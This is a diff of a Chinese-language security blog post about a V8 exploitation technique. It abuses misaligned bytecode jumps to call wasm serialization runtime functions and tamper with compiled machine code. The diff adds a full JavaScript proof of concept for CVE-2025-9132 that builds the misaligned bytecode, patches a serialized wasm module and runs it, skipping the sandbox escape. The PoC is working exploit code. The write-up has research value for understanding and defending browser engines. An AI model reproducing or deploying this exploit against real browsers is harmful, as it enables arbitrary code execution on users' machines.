@@ -13,7 +13,7 @@ tags: [ v8, bytecode ]
 
 ## 利用手法介绍
 
-这种利用手法假设通过某个漏洞已经可以获取错位bytecode跳转. 而且版本不能太新, 因为用到的runtime函数(`%SerializeWasmModule, %DeserializeWasmModule`)在[2025-08](https://chromium-review.googlesource.com/c/v8/v8/+/6875821)被移到了`d8.wasm`下, 真实浏览器环境可能用不了了. 以及在新版`d8.wasm.deserializeModule`有对raw machine code的hash校验, 不允许对其修改. hash校验存在bss上, 我看过了:(
+这种利用手法假设通过某个漏洞可以调用%SerializeWasmModule和%DeserializeWasmModule(通常这通过错位bytecode来实现). 而且版本不能太新, 因为用到的runtime函数(`%SerializeWasmModule, %DeserializeWasmModule`)在[2025-08](https://chromium-review.googlesource.com/c/v8/v8/+/6875821)被移到了`d8.wasm`下, 真实浏览器环境很可能用不了了. 以及在新版`d8.wasm.deserializeModule`有对raw machine code的hash校验, 不允许对其修改. hash校验存在bss上, 我看过了:(
 
 ### 错位bytecode构造
 首先从错位构造入手, 因为用`a = 0x12345678`这样的js语句可以生成4个字节可控(实际上并不能用到0xffffffff, 由于Smi的限制)的bytecode`01 0d 78 56 34 12 LdaSmi.ExtraWide [305419896]`, 除去两个字节用来跳转, 我们就可以有两个字节用来做别的事.
@@ -68,12 +68,68 @@ wasm_test();
 
 为啥说要有任意bytecode执行才能打呢, 因为正常浏览器环境肯定没有开`--allow-natives-syntax`, 所以需要我们手动构造call `%DeserializeWasmModule`和`%SerializeWasmModule`.
 
-## 可能可用的cve
+## 可用的cve
 
-cve-2025-10891存在理论可能, 因为它可以达成bytecode跳转. cve-2025-9132也存在理论可能, 之前我用这个cve能打出bytecode跳转.
+cve-2025-10891存在理论可能, 因为它可以达成bytecode跳转. cve-2025-9132则是确定可以利用, 因为可以构造错位的bytecode, 下面是poc
+```js
+const wire = new Uint8Array(readbuffer('exp.wasm'));
+const mod = new WebAssembly.Module(wire);
+let instance = new WebAssembly.Instance(mod);
+let { wasm_test } = instance.exports;
+for (let i = 0; i < 0x100000; i++){
+    wasm_test();
+}
+function make(target_slot){
+    return "a+1;\n".repeat(target_slot-0x11);
+}
+async function serializeWasmModule(mod){
+    let low = 0x0402836d;
+    let high = 0xb501;
+    let src = `async function bug(x, arg1, arg2){
+        void 0;void 0;void 0;
+        void 0;void 0;void 0;
+        void 0;void 0;void 0;
+        let a = 0;
+        switch(x) { case 0: case 1: case 2: case 3: case 4: case 5: ${make(high)}; }
+        for (await using z = { [Symbol.asyncDispose]() {} }; ;) return;
+        a+${low};
+        return x;
+    }`
+    eval(src);
+    return await bug(0, mod);
+}
+async function deserializeWasmModule(wire1, serialized){
+    let low = 0x05026f6d;
+    let high = 0xb502;
+    let src = `async function bug(x, arg1, arg2){
+        void 0;void 0;void 0;
+        void 0;void 0;void 0;
+        void 0;void 0;void 0;
+        let a = 0;
+        switch(x) { case 0: case 1: case 2: case 3: case 4: case 5: ${make(high)}; }
+        for (await using z = { [Symbol.asyncDispose]() {} }; ;) return;
+        a+${low};
+        return x;
+    }`
+    eval(src);
+    return await bug(0, wire1, serialized);
+}
+async function main(){
+    let serialized = await serializeWasmModule(mod);
+    let bytes = new Uint8Array(serialized);
+    bytes[107] = 0xcc;
+    const wire1 = new Uint8Array(wire.length + 4);
+    wire1.set(wire, 0);
+    wire1.set([0x00, 0x02, 0x01, 0x78], wire.length);
+
+    mod1 = await deserializeWasmModule(wire1, serialized);
+    let instance1 = new WebAssembly.Instance(mod1);
+    ({ wasm_test } = instance1.exports);
+
+    wasm_test();
+}
+
+main();
+```
 
 顺带一提, 之前我认为标准的浏览器利用链应该要是v8沙箱内部->逃逸v8沙箱->v8任意shellcode->renderer进程沙箱逃逸. 但这个利用手法似乎给了一种新的链子, 也就是不逃逸沙箱, 直接执行shellcode. 但现在是已经被修复了, 不太确定以后还会不会遇到这种不逃沙箱直接执行shellcode的链子.
-
-## 修复方案, 可用范围, 完整exp
-
-(有空再研究..先记录下...
